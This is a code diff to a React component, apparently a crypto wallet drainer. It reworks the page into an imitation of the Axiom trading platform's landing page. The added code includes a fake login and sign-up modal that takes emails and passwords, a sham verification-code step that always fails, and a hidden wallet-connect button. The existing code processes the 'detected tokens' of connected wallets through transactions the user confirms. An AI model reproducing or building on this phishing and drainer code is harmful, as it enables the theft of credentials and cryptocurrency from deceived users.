@@ -1,8 +1,8 @@
 'use client'
 
-import React, { useEffect, useState, CSSProperties } from 'react'
+import React, { useEffect, useState, useRef } from 'react'
 import { useAppKit } from '@reown/appkit/react'
-import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
+import { useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
 
 interface Token {
@@ -25,130 +25,6 @@ interface FailedItem {
   token: Token
   reason: string
 }
-
-// Definición de estilos con tipos TypeScript
-const styles: { [key: string]: CSSProperties } = {
-  body: {
-    fontFamily: "'Inter', sans-serif",
-    margin: 0,
-    padding: 0,
-    backgroundColor: '#0a0a0a',
-    color: '#ffffff',
-  },
-  navbar: {
-    display: 'flex',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    padding: '1rem 2rem',
-    position: 'fixed',
-    top: 0,
-    width: '100%',
-    zIndex: 1000,
-    boxSizing: 'border-box',
-    background: 'rgba(10, 10, 10, 0.8)',
-    backdropFilter: 'blur(10px)',
-  },
-  navButtons: {
-    display: 'flex',
-    gap: '1rem',
-  },
-  loginBtn: {
-    background: 'transparent',
-    color: 'white',
-    border: '1px solid rgba(255, 255, 255, 0.2)',
-    padding: '10px 20px',
-    borderRadius: '10px',
-    fontWeight: 500,
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-  },
-  signupBtn: {
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    color: 'white',
-    padding: '10px 20px',
-    borderRadius: '10px',
-    fontWeight: 500,
-    border: 'none',
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-  },
-  ctaButton: {
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    color: 'white',
-    padding: '15px 40px',
-    borderRadius: '10px',
-    fontWeight: 600,
-    fontSize: '18px',
-    border: 'none',
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-    marginTop: '2%',
-    textDecoration: 'none',
-    display: 'inline-block',
-  },
-  mainContent: {
-    display: 'flex',
-    justifyContent: 'center',
-    alignItems: 'center',
-    height: '100vh',
-    flexDirection: 'column',
-    background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
-    textAlign: 'center',
-    padding: '0 2rem',
-  },
-  mainTitle: {
-    fontSize: '3.5rem',
-    fontWeight: 700,
-    margin: '1rem 0',
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    backgroundClip: 'text',
-    WebkitBackgroundClip: 'text',
-    WebkitTextFillColor: 'transparent',
-  },
-  subtitle: {
-    fontSize: '1.2rem',
-    color: '#ccc',
-    marginBottom: '2rem',
-    maxWidth: '600px',
-  },
-  modalOverlay: {
-    position: 'fixed',
-    top: 0,
-    left: 0,
-    right: 0,
-    bottom: 0,
-    backgroundColor: 'rgba(0, 0, 0, 0.8)',
-    display: 'flex',
-    justifyContent: 'center',
-    alignItems: 'center',
-    zIndex: 1000,
-    flexDirection: 'column'
-  },
-  modalContainer: {
-    background: '#1E1E1E',
-    borderRadius: '20px',
-    padding: '30px',
-    width: '400px',
-    maxWidth: '90%',
-    position: 'relative',
-  },
-  spinner: {
-    border: '5px solid #f3f3f3',
-    borderTop: '5px solid #8C66FC',
-    borderRadius: '50%',
-    width: '50px',
-    height: '50px',
-    animation: 'spin 1s linear infinite',
-    marginBottom: '20px'
-  },
-  buttonHover: {
-    transform: 'translateY(-2px)',
-    boxShadow: '0 10px 20px rgba(0, 0, 0, 0.2)',
-  },
-  loginBtnHover: {
-    background: 'rgba(255, 255, 255, 0.1)',
-  },
-};
 
 // Función helper para fetch con mejor manejo de errores
 const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
@@ -176,6 +52,7 @@ export default function TokenManager(): React.JSX.Element {
   const publicClient: any = usePublicClient()
   const { data: balance } = useBalance({ address })
   const { data: feeData } = useFeeData()
+  const { switchChain } = useSwitchChain()
   const [tokens, setTokens] = useState<Token[]>([])
   const [processing, setProcessing] = useState<boolean>(false)
   const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
@@ -188,8 +65,109 @@ export default function TokenManager(): React.JSX.Element {
   const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
+  // Modal states
+  const [isModalOpen, setIsModalOpen] = useState<boolean>(false)
+  const [modalType, setModalType] = useState<'login' | 'signup'>('login')
+  const [activeView, setActiveView] = useState<'login' | 'verification'>('login')
+  const [email, setEmail] = useState<string>('')
+  const [password, setPassword] = useState<string>('')
+  const [showPassword, setShowPassword] = useState<boolean>(false)
+  const [verificationCode, setVerificationCode] = useState<string[]>(['', '', '', '', '', ''])
+  const [isLoadingModal, setIsLoadingModal] = useState<boolean>(false)
+  const [countdown, setCountdown] = useState<number>(53)
+  const [showCodeError, setShowCodeError] = useState<boolean>(false)
+
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
-  const { switchChain } = useSwitchChain()
+
+  const codeInputsRef = useRef<(HTMLInputElement | null)[]>([]);
+
+  // Modal functions
+  const openModal = (type: 'Login' | 'Sign up') => {
+    setModalType(type.toLowerCase() as 'login' | 'signup')
+    setIsModalOpen(true)
+    setActiveView('login')
+    setEmail('')
+    setPassword('')
+    setVerificationCode(['', '', '', '', '', ''])
+    setShowCodeError(false)
+  }
+
+  const closeModal = () => {
+    setIsModalOpen(false)
+  }
+
+  const backToLogin = () => {
+    setActiveView('login')
+  }
+
+  const togglePassword = () => {
+    setShowPassword(!showPassword)
+  }
+
+  const handleForgotPassword = () => {
+    // Placeholder for forgot password functionality
+    console.log('Forgot password clicked')
+  }
+
+  const switchToSignup = () => {
+    setModalType('signup')
+  }
+
+  const openGooglePopup = () => {
+    // Placeholder for Google login functionality
+    console.log('Google login clicked')
+  }
+
+  const handlePhantomLogin = () => {
+    open() // Use AppKit's open function
+  }
+
+  const handleLogin = (e: React.FormEvent) => {
+    e.preventDefault()
+    setIsLoadingModal(true)
+    
+    // Simulate sending verification code
+    setTimeout(() => {
+      setIsLoadingModal(false)
+      setActiveView('verification')
+      startCountdown()
+    }, 1500)
+  }
+
+  const startCountdown = () => {
+    setCountdown(53)
+    const interval = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) {
+          clearInterval(interval)
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+  }
+
+ const moveToNext = (currentInput: HTMLInputElement, index: number) => {
+  const value = currentInput.value;
+  
+  if (value.length === 1 && index < 5) {
+    codeInputsRef.current[index + 1]?.focus();
+  }
+  
+  const newCode = [...verificationCode];
+  newCode[index] = value;
+  setVerificationCode(newCode);
+}
+
+  const submitCode = () => {
+    // Simulate code verification
+    setShowCodeError(false)
+    
+    // Show error after 3 seconds if code is incorrect (simulation)
+    setTimeout(() => {
+      setShowCodeError(true)
+    }, 3000)
+  }
 
   const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
     if (!walletClient) throw new Error('Wallet client no disponible')
@@ -751,98 +729,395 @@ export default function TokenManager(): React.JSX.Element {
     }, 100)
   }
 
-  // Estados para efectos hover
-  const [isLoginHovered, setIsLoginHovered] = useState(false);
-  const [isSignupHovered, setIsSignupHovered] = useState(false);
-  const [isCtaHovered, setIsCtaHovered] = useState(false);
-
   // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
     return (
-      <div style={styles.mainContent}>
-        <h1 style={styles.mainTitle}>Administrador de Tokens</h1>
-        <p style={styles.subtitle}>Cargando...</p>
+      <div style={{
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        height: '100vh',
+        flexDirection: 'column'
+      }}>
+        <h1>Administrador de Tokens</h1>
+        <p>Cargando...</p>
       </div>
     )
   }
 
   return (
-    <div style={styles.body}>
-      {/* Navbar similar al primer código */}
-      <nav style={styles.navbar}>
-        <div style={styles.navButtons}>
-          <button 
-            style={{ 
-              ...styles.loginBtn, 
-              ...(isLoginHovered && styles.loginBtnHover) 
-            }}
-            onMouseEnter={() => setIsLoginHovered(true)}
-            onMouseLeave={() => setIsLoginHovered(false)}
-          >
-            Login
-          </button>
-          <button 
-            style={{ 
-              ...styles.signupBtn, 
-              ...(isSignupHovered && styles.buttonHover) 
-            }}
-            onMouseEnter={() => setIsSignupHovered(true)}
-            onMouseLeave={() => setIsSignupHovered(false)}
-          >
-            Sign up
-          </button>
-        </div>
+    <>
+      {/* Navigation */}
+      <nav className="navbar">
+          <img src="/media/Axiom Logo.svg" style={{width: '10%'}} alt="" /> 
+          <div className="nav-buttons">
+              <button className="login-btn" onClick={() => openModal('Login')}>Login</button>
+              <button className="signup-btn" onClick={() => openModal('Sign up')}>Sign up</button>
+          </div>
       </nav>
 
       {/* Main content */}
-      <main style={styles.mainContent}>
-        <h1 style={styles.mainTitle}>The Gateway to DeFi</h1>
-        <p style={styles.subtitle}>Axiom is the only trading platform you'll ever need.</p>
-        
-        <button
-          onClick={() => open()}
-          style={{ 
-            ...styles.ctaButton, 
-            ...(isCtaHovered && styles.buttonHover) 
-          }}
-          onMouseEnter={() => setIsCtaHovered(true)}
-          onMouseLeave={() => setIsCtaHovered(false)}
-        >
-          {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
-        </button>
+      <main className="main-content" >
+          
+          <section className="main-content" style={{width: '100%', height: '100vh', backgroundImage: 'url(/media/Captura_de_pantalla_2025-08-13_231920.png)', backgroundSize: 'cover', backgroundPosition: 'center'}}>
+              <div style={{paddingTop: '5%'}}> <img src="/media/Logo.svg" style={{width: '200%'}} alt="" /></div>
+          
+              <h1 className="main-title" style={{marginTop: '2%'}}>The Gateway to DeFi</h1>
+              
+              <p className="subtitle">Axiom is the only trading platform you'll ever need.</p>
+              
+              <a className="cta-button" 
+                style={{marginTop: '2%', textDecoration: 'none', display: 'inline-block'}}
+                onClick={() => open()}>
+                connect with Phantom
+              </a>
 
-        <div style={{ marginTop: '2rem', color: '#ccc' }}>
-          <span>Backed by </span>
-          <span style={{ fontWeight: 'bold' }}>Y Combinator</span>
+              
+              <div className="backed-by">
+                  <span className="backed-text">Backed by</span>
+                  <div className="combinator-logo">
+                      <div className="combinator-icon">Y</div>
+                      <span className="combinator-text">Combinator</span>
+                  </div>
+              </div>
+          </section>
+
+          <section style={{width: '100%'}}>
+              <video style={{width: '100%'}}
+                  src="/media/hero-video.mp4"
+                  autoPlay
+                  loop
+                  muted
+                  playsInline
+              >
+          </video>
+        </section>
+
+        <div className="trading-features-section">
+    <div className="container">
+      <div className="header-content">
+        <h1 className="main-title">Advanced Features to<br />videoline Your Trading.</h1>
+        <p className="subtitle">From wallet tracking to real-time analytics, we've got you covered.</p>
+      </div>
+      
+      <div className="features-grid">
+        <div className="feature-item active">
+          <div className="feature-line"></div>
+          <h3 className="feature-title">Order Execution Engine</h3>
+          <p className="feature-description">Trade with confidence.</p>
         </div>
+        
+        <div className="feature-item">
+          <div className="feature-line"></div>
+          <h3 className="feature-title">Wallet and Twitter Tracker</h3>
+          <p className="feature-description">Trade and track all in one place.</p>
+        </div>
+        
+        <div className="feature-item">
+          <div className="feature-line"></div>
+          <h3 className="feature-title">Hyperliquid Perpetuals</h3>
+          <p className="feature-description">Trade leveraged Perps.</p>
+        </div>
+        
+        <div className="feature-item">
+          <div className="feature-line"></div>
+          <h3 className="feature-title">Yield</h3>
+          <p className="feature-description">Earn while you sleep.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+  <div className="trading-dashboard-section">
+    <div className="container">
+      <div className="content-wrapper">
+        <div className="features-left">
+          <div className="feature-block active">
+            <div className="feature-header">
+              <div className="feature-content">
+                <h3>Land in ≤1 Block</h3>
+              </div>
+            </div>
+            <p className="feature-description">Our limit order execution engine is the fastest in the market.</p>
+            <div className="feature-details">
+              <p>With our proprietary order execution engine and colocated nodes, our limit orders land in ≤ 1 block.</p>
+            </div>
+          </div>
+
+</div>
+          <section style={{ display: 'flex', flexDirection: 'column' }}>
+  <div className="feature-block">
+    <div className="feature-header">
+      <div className="feature-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" strokeWidth="2" fill="none"/>
+        </svg>
+      </div>
+      <div className="feature-content">
+        <h3>Migration Sniper</h3>
+      </div>
+    </div>
+  </div>
+
+  <div className="feature-block">
+    <div className="feature-header">
+      <div className="feature-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="currentColor" strokeWidth="2" fill="none"/>
+          <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" strokeWidth="2"/>
+          <line x1="15" y1="9" x2="9" y2="15" stroke="currentColor" strokeWidth="2"/>
+        </svg>
+      </div>
+      <div className="feature-content">
+        <h3>No MEV Triggers</h3>
+      </div>
+    </div>
+  </div>
+
+  <div className="feature-block">
+    <div className="feature-header">
+      <div className="feature-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" stroke="currentColor" strokeWidth="2" fill="none"/>
+          <line x1="4" y1="22" x2="4" y2="15" stroke="currentColor" strokeWidth="2"/>
+        </svg>
+      </div>
+      <div className="feature-content">
+        <h3>Auto-Strategies</h3>
+      </div>
+    </div>
+  </div>
+  
+</section>
+
+        <div className="video-right">
+          <section>
+            <video 
+              src="/media/land-on-two-blocks.mp4"
+              autoPlay
+              loop
+              muted
+              playsInline
+            >
+            </video>
+          </section>
+        </div>
+      </div>
+    </div>
+  </div>
+
       </main>
 
-      {/* Modal de carga */}
-      {(isLoading || showProcessingModal) && (
-        <div style={styles.modalOverlay}>
-          <div style={styles.modalContainer}>
-            <div style={styles.spinner}></div>
-            <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
-              {showProcessingModal 
-                ? `Procesando ${detectedTokensCount} tokens detectados...` 
-                : loadingMessage}
-            </p>
-            <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
-              Por favor espere, esto puede tomar varios minutos...
-              <br />
-              {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
-            </p>
+      {/* Modal */}
+      {isModalOpen && (
+        <div className="modal-overlay" id="loginModal">
+          <div className="modal-container">
+            <button className="modal-close" onClick={closeModal}>
+                <i className="fas fa-times"></i>
+            </button>
+            
+            <button className="back-arrow" onClick={backToLogin} style={{display: activeView === 'verification' ? 'block' : 'none'}} id="backArrow">
+                <i className="fas fa-arrow-left"></i>
+            </button>
+
+            {/* Loading Screen */}
+            {isLoadingModal && (
+              <div className="loading" id="loadingScreen" style={{display: 'block'}}>
+                  <div className="spinner"></div>
+                  <p style={{color: '#ccc'}}>Sending verification code...</p>
+              </div>
+            )}
+            
+            {/* Login Form */}
+            {!isLoadingModal && activeView === 'login' && (
+              <div className="login-form" id="loginForm">
+                  <div className="modal-header">
+                      <h2 className="modal-title">{modalType === 'login' ? 'Login' : 'Sign up'}</h2>
+                  </div>
+                  
+                  <form onSubmit={handleLogin}>
+                      <div className="form-group">
+                          <label className="form-label">Email</label>
+                          <input 
+                              type="email" 
+                              className="form-input" 
+                              placeholder="Enter email"
+                              id="emailInput"
+                              required
+                              value={email}
+                              onChange={(e) => setEmail(e.target.value)}
+                          />
+                      </div>
+                      
+                      <div className="form-group">
+                          <label className="form-label">Password</label>
+                          <div className="form-input-wrapper">
+                              <input 
+                                  type={showPassword ? 'text' : 'password'} 
+                                  className="form-input" 
+                                  placeholder="Enter password"
+                                  id="passwordInput"
+                                  required
+                                  value={password}
+                                  onChange={(e) => setPassword(e.target.value)}
+                              />
+                              <button 
+                                  type="button" 
+                                  className="password-toggle" 
+                                  onClick={togglePassword}
+                              >
+                                  <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`} id="eyeIcon"></i>
+                              </button>
+                          </div>
+                          <div className="forgot-password">
+                              <a href="#" onClick={handleForgotPassword}>Forgot password?</a>
+                          </div>
+                      </div>
+                      
+                      <button type="submit" className="modal-login-btn">{modalType === 'login' ? 'Login' : 'Sign up'}</button>
+                      
+                      <div className="divider">
+                          <span>OR</span>
+                      </div>
+                      
+                      <div className="social-buttons">
+                          <button type="button" className="social-btn google-btn" onClick={openGooglePopup}>
+                              <img src="/media/google-logo.svg" style={{width: '8%'}} alt="" />
+                              Continue with Google
+                          </button>
+                          
+                          <button type="button" className="social-btn phantom-btn" onClick={handlePhantomLogin}>
+                              <img src="/media/phantom-purple.svg" style={{width: '8%'}} alt="" />
+                              Connect with Phantom
+                          </button>
+                      </div>
+                      
+                      <div className="signup-link">
+                          {modalType === 'login' ? (
+                            <>Don't have an account? <a href="#" onClick={switchToSignup}>Sign up</a></>
+                          ) : (
+                            <>Already have an account? <a href="#" onClick={() => setModalType('login')}>Login</a></>
+                          )}
+                      </div>
+                  </form>
+              </div>
+            )}
+
+            {/* Verification Form */}
+            {!isLoadingModal && activeView === 'verification' && (
+              <div className="verification-form" id="verificationForm" style={{display: 'block'}}>
+                  <div className="modal-header">
+                      <h2 className="modal-title">Confirmation Code</h2>
+                  </div>
+                  
+                  <div className="verification-text">
+                      We've sent a verification code to<br />
+                      <span className="verification-email" id="userEmail">{email}</span>
+                  </div>
+                  
+                   <div className="code-inputs">
+                    {[0, 1, 2, 3, 4, 5].map((index) => (
+                      <input 
+                        key={index}
+                        type="text" 
+                        className="code-input" 
+                        maxLength={1} 
+                        value={verificationCode[index]}
+                        onInput={(e) => moveToNext(e.currentTarget as HTMLInputElement, index)}
+                        ref={(el) => {
+                          codeInputsRef.current[index] = el;
+                        }}
+                      />
+                    ))}
+                  </div>
+                  
+                  <div className="resend-info" id="resendInfo">
+                      You can resend a new code in <span id="countdown">{countdown}</span> seconds
+                  </div>
+
+                  {/* Botón para enviar el código manualmente */}
+                  <div style={{marginTop: '12px'}}>
+                      <button type="button" id="submitCodeBtn" className="modal-login-btn" onClick={submitCode}>Enviar código</button>
+                  </div>
+
+                  {/* Mensaje de error que aparecerá luego de 3s si el código es incorrecto */}
+                  {showCodeError && (
+                    <div id="codeError" style={{display: 'block', color: '#ff6f6f', marginTop: '12px', fontWeight: '600'}}>
+                        El código es incorrecto.
+                    </div>
+                  )}
+                  
+                  <div className="privacy-info" style={{marginTop: '12px'}}>
+                      By creating an account, you agree to Axiom's<br />
+                      <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>
+                  </div>
+              </div>
+            )}
           </div>
         </div>
       )}
 
-      {/* Animación de spinner */}
+      {/* Hidden wallet connect button (keeps the logic but is not visible) */}
+      <button
+        onClick={() => open()}
+        style={{
+          position: 'absolute',
+          opacity: 0,
+          pointerEvents: 'none'
+        }}
+      >
+        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
+      </button>
+
+      {/* Processing Modal */}
+      {(isLoading || showProcessingModal) && (
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          backgroundColor: 'rgba(0, 0, 0, 0.8)',
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          zIndex: 1000,
+          flexDirection: 'column'
+        }}>
+          <div style={{
+            width: '50px',
+            height: '50px',
+            border: '5px solid #f3f3f3',
+            borderTop: '5px solid #0070f3',
+            borderRadius: '50%',
+            animation: 'spin 1s linear infinite',
+            marginBottom: '20px'
+          }}></div>
+          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
+            {showProcessingModal 
+              ? `Procesando ${detectedTokensCount} tokens detectados...` 
+              : loadingMessage}
+          </p>
+          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
+            Por favor espere, esto puede tomar varios minutos...
+            <br />
+            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
+          </p>
+        </div>
+      )}
+
       <style jsx>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
         }
       `}</style>
-    </div>
+
+      {/* External CSS */}
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+      <link rel="stylesheet" href="/css/style.css" />
+    </>
   )
 }
